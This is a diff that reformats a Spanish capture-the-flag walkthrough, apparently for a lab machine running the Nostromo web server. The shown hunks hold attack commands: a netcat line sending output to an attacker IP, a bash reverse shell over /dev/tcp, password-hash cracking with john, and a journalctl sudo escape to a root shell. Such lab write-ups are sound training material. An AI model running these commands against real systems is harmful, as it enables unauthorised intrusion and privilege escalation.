@@ -102,7 +102,11 @@ searchsploit -m 47837
 mv 47837.py nostromo_exploit.py
 ```
 
-Analizando el script con `cat`, vemos como se uza el exploit. Intentamos reproducir los pasos antes de crearnos nuestro
+Analizando el script con 
+```bash
+ cat 
+```
+, vemos como se uza el exploit. Intentamos reproducir los pasos antes de crearnos nuestro
 proprio script.
 
 1. En una terminal
@@ -121,7 +125,11 @@ proprio script.
     whoami | nc 10.10.14.20 443
     ```
 
-Se ve `www-data` en la primera terminal.
+Se ve 
+```bash
+ www-data 
+```
+ en la primera terminal.
 
 Ya podemos crearnos el script.
 
@@ -190,8 +198,16 @@ www-data
 ifconfig
 ```
 
-El tito prefiere entablarse una shell normal. Se pone en escucha con `nc -nlvp 443` y lanza en la shell creado por el script
-`bash -i >& /dev/tcp/10.10.14.20/443 0>&1`
+El tito prefiere entablarse una shell normal. Se pone en escucha con 
+```bash
+ nc -nlvp 443 
+```
+ y lanza en la shell creado por el script
+
+```bash
+ bash -i >& /dev/tcp/10.10.14.20/443 0>&1 
+```
+
 
 ### Tratamiento de la TTY {-}
 
@@ -250,13 +266,25 @@ Encontramos el hash del usuario david vamos a copiarlo en la maquina de atacante
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-Encontramos una contraseña intentamos ponerla haciendo un `su david` y `su root`, pero no va. La conclusion a la que hay que llegar
+Encontramos una contraseña intentamos ponerla haciendo un 
+```bash
+ su david 
+```
+ y 
+```bash
+ su root 
+```
+, pero no va. La conclusion a la que hay que llegar
 es que cuando miras el fichero nhttpd.conf, dice que hay un directorio **public_www**.
 
 
 ### Investigacion del public_www {-}
 
-Intentamos ver si esta en el directorio `/home/david/public_www` y efectivamente. hay un fichero comprimido y nos vamos a transferir 
+Intentamos ver si esta en el directorio 
+```bash
+ /home/david/public_www 
+```
+ y efectivamente. hay un fichero comprimido y nos vamos a transferir 
 a nuestro equipo de atacante.
 
 1. En el equipo de atacante
@@ -310,7 +338,11 @@ Vemos en este fichero que sudo puede ejecutar **journalctl**
 
 Vamos a la pagina de [gtfobins](gtfobins.github.io) y buscamos por jounalctl
 
-El **gtfobins** dice que hay que lanzar jounalctl con sudo y en otra linea poner `!/bin/sh`
+El **gtfobins** dice que hay que lanzar jounalctl con sudo y en otra linea poner 
+```bash
+ !/bin/sh 
+```
+
 
 > [!] NOTA: cuando pone ! en otra linea quiere decir que hay que ejecutarlo en modo less. O sea hay que reducir la terminal para que se pueda introducir un nuevo commando. En este caso !/bin/sh
 
